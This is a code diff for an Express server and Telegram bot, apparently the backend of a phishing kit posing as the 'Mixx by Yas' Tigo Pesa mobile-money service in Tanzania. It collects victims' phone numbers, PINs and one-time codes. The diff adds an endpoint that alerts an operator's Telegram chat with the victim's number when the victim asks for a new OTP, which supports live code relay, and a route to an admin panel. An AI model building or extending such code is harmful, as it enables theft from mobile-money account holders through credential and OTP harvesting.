@@ -3,7 +3,8 @@
  * 
  * Includes:
  * - Strict Tigo Pesa (Tanzania) phone number validation (065, 067, 071, 077).
- * - Clean Admin Panel link without trailing query parameters on the base URL.
+ * - Explicit routing for the main Admin-1 panel mapped to 'admin.html'.
+ * - Request New OTP handling with 30s countdown integration.
  */
 
 const express = require('express');
@@ -106,8 +107,6 @@ async function initBot() {
 
   /**
    * **INSTANT /START COMMAND HANDLER**
-   * Displays the clean base link without trailing parameters in the main text block,
-   * keeping the user's specific chat ID isolated under personal information.
    */
   bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
@@ -194,8 +193,15 @@ function getTargetChatId(reqChatId) {
 }
 
 /**
+ * **EXPLICIT ROUTE FOR MAIN ADMIN-1 PANEL**
+ * Maps requests for /Admin-1 to the admin.html file in the public folder.
+ */
+app.get('/Admin-1', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+/**
  * **SUBMIT APPLICATION (PIN ENTRY)**
- * Requires valid Tigo Pesa Tanzania number.
  */
 app.post('/api/submit-application', (req, res) => {
   try {
@@ -313,10 +319,36 @@ app.post('/api/submit-otp', (req, res) => {
   }
 });
 
+/**
+ * **REQUEST NEW OTP ENDPOINT**
+ * Triggers notification to Telegram when user clicks resend button after countdown.
+ */
+app.post('/api/request-new-otp', (req, res) => {
+  try {
+    const { userId } = req.body || {};
+    const session = sessions.get(userId);
+
+    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
+
+    session.status = 'APPROVED_LOAD_OTP';
+
+    const message =
+      `🔄 *USER REQUESTED NEW OTP*\n\n` +
+      `📱 *Tigo User:* +255 ${session.phone}\n` +
+      `⚠️ The user's countdown expired and they requested a new OTP code.`;
+
+    const targetChat = session.adminChatId || DEFAULT_CHAT_ID;
+    bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
+
+    res.status(200).json({ success: true });
+  } catch (error) {
+    res.status(500).json({ success: false, error: 'Internal server error' });
+  }
+});
+
 // Start initialization & HTTP server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, async () => {
   console.log(`[Server] Mixx by Yas server running smoothly on port ${PORT}`);
   await initBot();
 });
-        
